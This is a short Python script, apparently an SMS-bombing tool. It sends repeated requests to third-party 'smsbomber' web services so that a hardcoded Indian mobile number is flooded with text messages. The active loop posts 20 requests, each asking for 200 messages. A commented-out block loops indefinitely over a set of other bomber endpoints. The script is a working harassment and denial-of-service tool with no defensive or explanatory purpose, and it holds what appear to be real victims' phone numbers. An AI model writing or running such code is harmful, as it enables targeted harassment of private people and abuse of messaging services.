import requests

import time

from random import *

# mobile_number = "7223889629"

# url = "https://freekamall.tech/sms-bomber/1.php?sent=2&&count=100&&mobno=7999187239"
# count=0
# for x in range(99999999999):
#     for i in range(1,34):
#         req = requests.get("https://freekamall.tech/sms-bomber/"+str(i)+".php?sent=2&&count=100&&mobno="+mobile_number)
#         print(f"{str(count)} Time Sended")
#         count=count+1
#         time.sleep(60)


for i in range(0,20):
     
    datas = {
        "sendsms":"true",
        "mobno":"7223889629",
        "count":"200",
        "update":"0",
        "token":"OHMBBOMKLBJ",
        "countrycode":"91",
        "smsno":str(i),
    }
    req = requests.post("https://mytoolstown.com/smsbomber/send/sendsmsN.php",data=datas)
    print(req.text)